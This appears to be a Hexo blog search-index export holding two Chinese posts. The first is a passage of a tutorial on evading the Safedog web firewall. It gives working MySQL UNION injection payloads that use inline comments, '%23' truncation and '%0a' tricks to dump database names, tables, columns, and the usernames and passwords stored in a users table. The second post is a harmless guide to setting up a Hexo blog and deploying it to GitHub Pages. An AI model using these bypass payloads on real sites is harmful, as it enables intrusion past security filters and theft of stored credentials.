class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10440–10449 13440-13449 14400-14499 15440-15449 16440-16449 17440-17449 18440-18449 等等</span><br></pre></td></tr></table></figure><p>但是在更新后的安全狗后这些payload已经全部被拦截</p><p><img src="/assets/image-20220210112947-p973ryj.png" alt="image.png"></p><p>到这就不得不提提安全狗之前的匹配规则了，我们单独union不会被拦截</p><p><img src="/assets/image-20220210102704-nrcpsi2.png" alt="image.png"></p><p>单独select也不会被拦截</p><p><img src="/assets/image-20220210102744-tm2k93h.png" alt="image.png"></p><p>但是union和select放一起组合就会被匹配出来，然后被安全狗所拦截</p><p><img src="/assets/image-20220210102844-j4t2eo1.png" alt="image.png"></p><p>基于这个特性，我们利用之前的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union/*!10440*/select 1,2,3--+</span><br></pre></td></tr></table></figure><p>是可以绕过老版本的安全狗的，这里在union和select中间加入了一个&#x2F;*!10440*&#x2F;，众所周知在mysql中&#x2F;*!…*&#x2F;不是注释，mysql为了保持兼容，它把一些特有的仅在mysql上用的语句放在&#x2F;*!…*&#x2F;中，这样这些语句如果在其他数据库中是不会被执行，但在mysql中它会执行。</p><p>所以union&#x2F;*!10440*&#x2F;select等价于union select,且绕过了安全狗对union和select字符一起组合的检测</p><p><img src="/assets/image-20220210113247-o80q334.png" alt="image.png"></p><p><img src="/assets/image-20220210113309-8ovvx1n.png" alt="image.png"></p><p>但是安全狗更新之后，所有的payload都已经失效，那么我们猜测一下，安全狗更新后是不是匹配union和select之间所有的字符，匹配到之后用空字符替换，再检测是否存在union select组合，为了验证这个猜测我们对我们的payload进行fuzz验证一下</p><p>跑了一些特殊的字符发现都被拦截<img src="/assets/image-20220210104653-4fuct55.png" alt="image.png"></p><p>但是唯独有一个符号没有被返回的length长度不一样</p><p><img src="/assets/image-20220210105306-j317gqe.png" alt="image.png"></p><p>按我们看看这个’#’会擦出什么爱情的火花</p><p>我们利用如下语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union/*!test01#test02*/select 1,2,3--+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220210105529-1seiqqq.png" alt="image.png"></p><p>此处我们搞清楚一个流程，我们的语句发送过去，首先接收安全狗检测，安全狗检测到’#’号，所以’#‘后面的都会被截断抛弃，所以安全狗只能匹配到’#‘前的union，但是没匹配到’#‘后的select，所以通过安全狗。在通过安全狗后我们的语句被数据库接收，数据库此处处理过程和安全狗处理流程一样，都是只能匹配到’#‘前的union，但是没匹配到’#‘后的select，最终导致语句不完整导致最后的报错。</p><p>说到这里我们究竟要怎么去绕过这个可恶的安全狗呢，我们想象这么一个场景，首先我们的’#‘被安全狗识别，但是在我们的SQL语句中并不识别这个’#‘，这样我们就可以达到绕过安全狗而且保持正确的SQL语句来实现我么的注入。</p><p>我们来看下下面两语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM number WHERE home_id =1 LIKE &quot;[%23]&quot;;</span><br><span class="line">SELECT * FROM number WHERE home_id =1 LIKE &quot;[%23]&quot; union select * FROM number;</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220210111606-4sc540e.png" alt="image.png"></p><p><img src="/assets/image-20220210111634-q48r6c9.png" alt="image.png"></p><p>此处SELECT * FROM number WHERE home_id &#x3D;1 LIKE “[%23]”;查出来一个空表</p><p>所以SELECT * FROM number WHERE home_id &#x3D;1 LIKE “[%23]” union select * FROM number;相当于select * FROM number；</p><p>该语句是存在一个LIKE “[%23]”，也正是这个LIKE “[%23]”让我们的SELECT * FROM number WHERE home_id &#x3D;1成为一个空表。</p><p><img src="/assets/image-20220210111930-hwjeqmo.png" alt="image.png"></p><p><img src="/assets/image-20220210112007-qm4enya.png" alt="image.png"></p><p>那么这个语句有什么用的，可以发现我们的LIKE “[%23]”中有一个%23，众所周知#的url编码是%23，那么这条语句带入到安全狗中，安全狗会不会识别这个#呢，带着这样的猜想我们构造如下payload。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; like &quot;[%23]&quot; /*!10440union select*/ 1,2,3 --+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220210113656-jmvg52w.png" alt="image.png"></p><p>呜呜呜，还是被拦截了，吹牛逼吹了这么久，白吹了。</p><p>但是我这种阳光、帅气、善解人意且坚持不懈的小伙子会这么容易就放弃吗，显然不会，后面猜测是&#x2F;*!10440union select*&#x2F;中的union select被检测出来了，所以在union select中间下了点功夫，最终payload如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; like &quot;[%23]&quot; /*!10440union%0aselect*/ 1,2,3 --+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220210114600-drzjavp.png" alt="image.png"></p><p>奈何无文化，一句卧槽走天下。</p><p>最后总结下安全狗的检测机制</p><p>首先整体语句做一个检测，这个检测也是最强最牛X的</p><p>‘#‘后的语句虽然被截断，但截断之后并不是和我们最初想的那样完全不检测，’#‘截断的语句还是会被检测，只是检测规则相比第一次不同且相比第一次检测强度相比较弱，所以我们可以对其进行绕过。</p><p>当然除了like关键字，我们还可以使用如下payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; and &quot;[%23]&quot; /*!10440union%0aselect*/ 1,2,3 --+</span><br><span class="line">-1&#x27; or &quot;[%23]&quot; /*!10440union%0aselect*/ 1,2,3 --+</span><br><span class="line">-1&#x27; regexp &quot;[%23]&quot; /*!10440union%0aselect*/ 1,2,3 --+</span><br><span class="line">-1&#x27; /*%23*/ /*!10440union%0aselect*/ 1,2,3 --+</span><br></pre></td></tr></table></figure><p>知道了这个特性接下来就，那就用这一招打过天下无敌手</p><p>爆数据库名和用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; like &quot;[%23]&quot; /*!10440union%0aselect*/ 1,database(/*!10440%0a*/),user(/*!10440%0a*/)--+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220210150144-zx3u2iv.png" alt="image.png"></p><p>爆表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; like &quot;[%23]&quot; /*!10440union%0aselect*/ 1,database(/*!10440%0a*/),group_concat(table_name) from/*%23*/information_schema.tables where table_schema=database(/*!10440%0a*/)--+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220211094933-cz39a4b.png" alt="image.png"></p><p>爆字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; like &quot;[%23]&quot; /*!10440union%0aselect*/ 1,database(/*!10440%0a*/),group_concat(column_name) from/*%23*/information_schema.columns where table_schema=database(/*!10440%0a*/) /*!10440and*/ table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220211101324-3d9lcrx.png" alt="image.png"></p><p>爆字段中的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; like &quot;[%23]&quot; /*!10440union%0aselect*/ 1,database(/*!10440%0a*/),group_concat(username,password) from users--+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220211101528-yxoqchw.png" alt="image.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1、内联yyds</p><p>2、在一些被拦截的地方多用&#x2F;*%23*&#x2F;和&#x2F;*!<em>10440%0a</em>*&#x2F;，有奇效。</p>]]></content>
      
      
      <categories>
          
          <category> Waf绕过小技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Waf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客搭建</title>
      <link href="/2023/04/29/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
      <url>/2023/04/29/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="仓库准备"><a href="#仓库准备" class="headerlink" title="仓库准备"></a>仓库准备</h1><p>创建一个github仓库</p><p><img src="/assets/image-20230428113657-foci2pj.png" alt="image.png"></p><p>名字格式如下</p><p><img src="/assets/image-20230428143514-5re00dt.png" alt="image.png"></p><p>创建完成</p><p><img src="/assets/image-20230428143531-7pssyed.png" alt="image.png"></p><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>可百度自行寻找安装方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安装npm</span><br><span class="line">安装git</span><br></pre></td></tr></table></figure><p>安装完成后确保能使用如下命令</p><p><img src="/assets/image-20230428114119-smyr1cd.png" alt="image.png"></p><p><img src="/assets/image-20230428114134-7i475dw.png" alt="image.png"></p><h1 id="博客搭建"><a href="#博客搭建" class="headerlink" title="博客搭建"></a>博客搭建</h1><p>创建一个目录，名字任意，然后打开git bash</p><p><img src="/assets/image-20230428114242-4sciiw9.png" alt="image.png"></p><p>使用git init初始化目录</p><p><img src="/assets/image-20230428114340-l6u5g0u.png" alt="image.png"></p><p>在git根目录下创建一个Blog目录，打开cmd窗口用如下命令安装hexo-cli</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>然后在Blog目录下使用如下命令完成hexo初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230428114827-anozuyy.png" alt="image.png"></p><p>初始化后的文件结构</p><p><img src="/assets/image-20230428114845-kg8ru0e.png" alt="image.png"></p><p>使用如下命令启动博客</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230428115010-qsc09n5.png" alt="image.png"></p><p>本地访问</p><p><img src="/assets/image-20230428115023-d7gxtc1.png" alt="image.png"></p><h1 id="切换主题"><a href="#切换主题" class="headerlink" title="切换主题"></a>切换主题</h1><p>Hexo默认的主体比较简约，屏幕使用占比不是很高，用户可以根据自己的喜好自定义Hexo主体，这里以butterfly主题为例</p><p>在Hexo的根目录执行如下命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master https:<span class="comment">//github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span></span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230428133950-mcf3uwk.png" alt="image.png"></p><p>在&#x2F;Blog&#x2F;themes下会克隆一个文件夹下来</p><p><img src="/assets/image-20230428134131-7qkc7yq.png" alt="image.png"></p><p>然后在Hexo的根目录下修改_config.yml文件里的theme为butterfly</p><p><img src="/assets/image-20230428134342-4oab1oq.png" alt="image.png"></p><p>修改后在安装一下 pug 和 stylus 的渲染器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230428134521-73agchw.png" alt="image.png"></p><p>重新启动查看效果</p><p><img src="/assets/image-20230428134620-sc08gi3.png" alt="image.png"></p><h1 id="上传Github"><a href="#上传Github" class="headerlink" title="上传Github"></a>上传Github</h1><p>本地搭建没有问题之后，就可以把博客部署到Github仓库里去了</p><p>复制我们之前创建好的仓库的地址</p><p><img src="/assets/image-20230428143709-6100690.png" alt="image.png"></p><p>然后在Hexo的根目录下的_config.yml进行如下配置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: <span class="string">&#x27;git&#x27;</span></span><br><span class="line">  repository: https:<span class="comment">//github.com/suifeng-kali/suifeng-kali.github.io.git</span></span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230428143638-vwbi1d9.png" alt="image.png"></p><p>配置好后可以下载一个deploy-git，利用deploy-git简化部署步骤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230428140134-k25rrrp.png" alt="image.png"></p><p>然后使用如下命令进行部署</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">hexo deploy</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230428214432-1ecgmg6.png" alt="image.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
